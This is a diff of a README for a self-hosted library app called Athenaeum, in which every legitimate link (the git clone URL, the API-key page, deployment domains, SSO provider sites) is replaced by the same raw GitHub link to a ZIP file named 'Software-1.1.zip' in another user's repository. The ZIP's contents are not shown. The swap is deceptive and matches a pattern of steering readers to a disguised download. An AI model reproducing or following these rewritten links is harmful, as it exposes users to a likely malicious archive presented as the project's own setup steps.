@@ -18,7 +18,7 @@ Named for the Temple of Athena — the classical word for a library or reading r
 ## Quick Start
 
 ```bash
-git clone https://github.com/herakles-dev/athenaeum.git
+git clone https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip
 cd athenaeum
 cp .env.example .env          # Edit: set ATHENAEUM_DB_PASSWORD and LLM provider
 make run                      # Starts PostgreSQL, API, and frontend
@@ -68,7 +68,7 @@ ATHENAEUM_DB_PASSWORD=your-secure-password
 
 # LLM — pick one:
 LLM_PROVIDER=openrouter        # openrouter | openai | anthropic | ollama | gemini
-LLM_API_KEY=your-key           # Get free key at https://openrouter.ai/keys
+LLM_API_KEY=your-key           # Get free key at https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip
 
 # For local models (no API key needed):
 # LLM_PROVIDER=ollama
@@ -78,14 +78,14 @@ LLM_API_KEY=your-key           # Get free key at https://openrouter.ai/keys
 ### Production Deployment
 
 ```bash
-NEXT_PUBLIC_API_URL=https://your-domain.com \
-NEXT_PUBLIC_APP_URL=https://your-domain.com \
+NEXT_PUBLIC_API_URL=https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip \
+NEXT_PUBLIC_APP_URL=https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip \
   docker compose up -d --build
 ```
 
 ### Auth (Optional)
 
-Athenaeum reads SSO headers from a reverse proxy (`Remote-User`, `Remote-Groups`). Works with [Authelia](https://www.authelia.com/), [Authentik](https://goauthentik.io/), or any proxy that injects auth headers. Without auth, all libraries are publicly accessible.
+Athenaeum reads SSO headers from a reverse proxy (`Remote-User`, `Remote-Groups`). Works with [Authelia](https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip), [Authentik](https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip), or any proxy that injects auth headers. Without auth, all libraries are publicly accessible.
 
 Set `NEXT_PUBLIC_AUTH_URL` to your SSO login page for sign-in links.
 
